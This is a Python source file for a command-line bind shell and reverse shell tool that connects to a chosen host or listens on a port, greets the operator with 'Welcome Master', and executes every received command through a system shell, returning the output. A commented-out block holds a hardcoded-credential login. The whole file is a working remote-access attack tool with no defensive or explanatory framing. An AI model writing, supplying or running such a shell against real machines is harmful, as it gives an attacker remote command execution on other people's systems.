import os
import platform
import argparse
import sys
import socket
import subprocess


# Determine th OS for customising the prompt
def determine_os():
    if platform.system() is not None:
        if "Linux" in platform.system():
            return "Linux"
        elif "Windows" in platform.system():
            return "Windows"
        elif "Darwin" in platform.system():
            return "MacOSX"
        else:
            return "SomeBSOS"


#Determine the user for customising the prompt
def determine_privs(os_type):
    if os_type == "Windows":
        return 1
    else:
        return os.getuid()

'''
def local_ip():
    if os_type.lower() == "windows":
        return os.popen("ipconfig | findstr \"IPv4 Address.*\" ")
    elif os_type.lower() == "linux":
        return os.system("ifconfig enp3s0 | grep 'inet addr' | cut -d: -f2 | awk '{print $1}'")
    else:
        print("Not yet available on this OS")


def gateway():
    if os_type.lower() == "windows":
        return os.system("ipconfig | findstr \"Default Gateway.*\" ")
    elif os_type.lower() == "linux" or os_type.lower() == "macintosh":
        return os.system("route -n")
    else:
        print("Not yet available on this OS")
'''


#Bind socket to port and accept connections
def bind(port):
    try:
        print("Binding to port:", port + "\n")
        s.bind((str('localhost'), int(port)))
        s.listen(1)
        conn, addr = s.accept()
        host_address = str(addr[0])
        host_port = int(addr[1])
        print('Connection with', host_address , 'from port', str(host_port)+'\n')
#authenticate(host_address, host_port, conn)
        shell(host_address, host_port, conn)
    except Exception as e:
        print("Error binding: %s" % e)
        s.close()
        sys.exit(1)


#Attempt to connect to given client on given port
def reverse(host, port):
    print("\nAttempting to connect to %s on port: %d\n" % (host, port))
    try:
        s.connect((host, port))
        print("Connection Established with %s on port %d\n" % (host, port))
        s.sendto(bytearray('Welcome Master\r\n', 'utf-8'), (host, port))
        shell(host, port, s)
    except Exception as e:
        print("Error connecting to host. Exception is %s" % (e))
        s.close()
        sys.exit(1)


#Create a shell allowing the client to run commands.
def shell(host, port, conn):
    prompt_array = ['', '@', os_type, '#']
    if user_level == 0:
        prompt_array.insert(0, 'root')
    elif user_level > 0:
        prompt_array.insert(0, 'user')
    else:
        print("User level not 0 or > 0 ???")
        sys.exit(1)
    prompt = ''.join(prompt_array)
    while 1:
        try:
            print("Sending prompt.")
            conn.sendto(bytearray(prompt, 'utf-8'), (host, port))
            data = conn.recv(1024)
            command = data.decode("utf-8")
            if len(command) > 0:
                print('Received %s\n' % command)
                if 'cd ' in command:
                    directory = command.strip('cd ')
                    directory = directory.strip('\n')
                    os.chdir(directory)
                    conn.sendto(b'Changed Directory\n', (host, port))
                elif command.strip('\n') == 'quit':
                    print("typed quit")
                    conn.sendto(b'Goodbye\n', (host, port))
                    conn.close()
                    s.close()
                    break
                else:
                    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    stdout_value = process.stdout.read() + process.stderr.read()
                    conn.sendto(bytearray(stdout_value+b'\n'), (host, port))
        except Exception as e:
            print("Unexpected in shell function. Exception is %s" % e)
            conn.sendto(b'Unexpected error\n', (host, port))
            conn.close()
            s.close()
            sys.exit(1)

'''
def authenticate(host, port, conn):
    print("Attempting to authenticate")
    conn.sendto(bytearray("[*] Login [*]", 'utf-8'), (host, port))
    attempts_left = 3
    while attempts_left != 0:
        conn.sendto(bytearray('Username:', 'utf-8'), (host, port))
        usrnme = conn.recv(24).decode('utf-8')
        conn.sendto(bytearray("Password:", 'utf-8'), (host, port))
        passwd = conn.recv(48).decode('utf-8')
        if usrnme == "Gimbo" and passwd == "obmiG":
            shell(host, port, conn)
        else:
            conn.sendto(bytearray("Login Failed\n" + attempts_left +" attempts left", 'utf-8'), (host, port))
            attempts_left -= 1
'''

#Get command line arguments
def get_args():
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group()
    group.add_argument('-b', '--bind', help='Bind shell to port.', action="store_true")
    group.add_argument('-r', '--reverse', help='Reverse shell.', action="store_true")
    parser.add_argument('-s', '--server', help='Server to connect to. [Only used for reverse shell]')
    parser.add_argument('-p', '--port', help='Port to connect to.')
    args = parser.parse_args()

    if str(len(sys.argv)) == '1':
        parser.print_help()
    elif args.bind:
        if int(args.port) is not None:
            bind(args.port)
        else:
            print("Requires a port number")
            sys.exit(1)
    elif args.reverse:
        if str(args.server) is not None and int(args.port) is not None:
            reverse(str(args.server), int(args.port))
        else:
            print("Requires an IPv4 host address and a port number")

# Global Variables
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
os_type = determine_os()
user_level = determine_privs(os_type)

if __name__ == '__main__':
    get_args()
